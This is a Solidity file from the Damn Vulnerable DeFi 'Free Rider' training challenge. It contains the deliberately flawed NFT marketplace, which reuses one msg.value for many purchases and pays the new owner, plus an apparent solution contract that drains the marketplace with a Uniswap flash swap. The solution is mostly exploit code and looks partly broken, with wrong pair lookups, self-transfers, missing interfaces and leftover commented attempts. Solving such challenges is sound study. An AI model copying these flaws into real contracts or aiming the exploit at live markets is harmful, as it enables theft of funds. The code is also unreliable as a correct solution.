// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderBuyer.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./IUniswapV2Pair.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";




/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}


contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {

    using Address for address;

    DamnValuableNFT immutable dvnft;
    FreeRiderNFTMarketplace immutable marketPlace;
    FreeRiderBuyer immutable freeRiderBuyer;
    address payable immutable weth;
    address immutable factory;
    address immutable dvt;

    constructor (address payable _wethAddr, address _factoryAddr, address _dvtAddr, 
                address payable _marketPlaceAddr, address _freeRiderBuyerAddr, address _nftAddr) {
        dvt=_dvtAddr;
        marketPlace=FreeRiderNFTMarketplace(_marketPlaceAddr);
        freeRiderBuyer=FreeRiderBuyer(_freeRiderBuyerAddr);
        weth=_wethAddr;
        factory=_factoryAddr;
        dvnft = DamnValuableNFT(_nftAddr);
    }

    function flashLoanAttack(address _tokenToBorrow, uint256 _amount,address _pair)external{ //do a flash loan on the uniswap v2 (paying back with the  callback)

        //address pair = IUniswapV2Factory(factory).getPair(_tokenToBorrow, address(dvt));
        //address pair = IUniswapV2Factory(factory).createPair(_tokenToBorrow, address(dvnft));

	console.log("Token to borrow: ",_tokenToBorrow);
 	console.log("DV NFT address: ",address(dvnft));
       address pair = IUniswapV2Factory(factory).getPair(_tokenToBorrow, address(dvnft));

        //address pair = IUniswapV2Factory(factory).getPair(_tokenToBorrow, address(dvnft));

	console.log("Pair: ", pair);
        //address token0 = IUniswapV2Factory(pair).token0();
        //address token1 = IUniswapV2Factory(pair).token1(); 
        address token0 = IUniswapV2Pair(_pair).token0();
        address token1 = IUniswapV2Pair(_pair).token1();
 
        uint256 amount0Out = _tokenToBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenToBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenToBorrow, _amount);

        // using uniswap for a flashloal (rapid swap)
        //IUniswapV2Factory(pair).swap(amount0Out,amount1Out,address(this),data);
	IUniswapV2Pair(_pair).swap(amount0Out,amount1Out,address(this),data);

    }

/*
function swapEth(address router, address _tokenIn, address _tokenOut, uint _amount) public {
    IERC20(router).approve(router, _amount);
    address[] memory path;
    path = new address[](2);
    path[0] = _tokenIn;
    path[1] = _tokenOut;
    uint deadline = block.timestamp + 300;
    IUniswapV2Router(router). swapExactETHForTokens(... parameters);  
}
*/



    function uniswapV2Call (address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0,token1);

        (address tokenToBorrow, uint256 amount)=abi.decode(_data, (address,uint256));
        
        uint256 fee = ((amount *3)/997)+1;
        uint256 amountToRepay = amount + fee;

	console.log("Token to borrow: ", tokenToBorrow);

        //uint256 currentBalance = IERC20(tokenToBorrow).balanceOf(address(this));
        uint256 currentBalance = IERC20(tokenToBorrow).balanceOf(address(this));

	console.log("Current Balance of Token belongin to this address: ", currentBalance);
	console.log("Current Balance of Ethers to this address: ", address(this).balance);

//        tokenToBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", currentBalance));
//        DamnValuableToken(tokenToBorrow).withdraw(currentBalance);
        DamnValuableToken(tokenToBorrow).transfer(address(this),currentBalance);

        uint256[] memory nftIds = new uint256[](6);
        for(uint256 i = 0; i<6;i++){
            nftIds[i]=i;
        }

        marketPlace.buyMany{value: 15 ether}(nftIds);

        for(uint256 i = 0;i<6;i++){
            //dvnft.safeTransferFrom(address(this),freeRiderBuyer, i);
            //DamnValuableNFT(dvnft).safeTransferFrom(address(this),freeRiderBuyer, i);
            dvnft.transferFrom(address(this),address(freeRiderBuyer), i);
            //dvnft.safeTransferFrom(address(this),freeRiderBuyer, i,"");
        }

        //Paying back
        //(bool success) = weth.call{value: 15.1 ether}("");
        weth.call{value: 15.1 ether}("");

        //             _govAddr.call{value: 1 ether}(""); 
        IERC20(tokenToBorrow).transfer(pair, amountToRepay);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data ) external override pure returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}

}

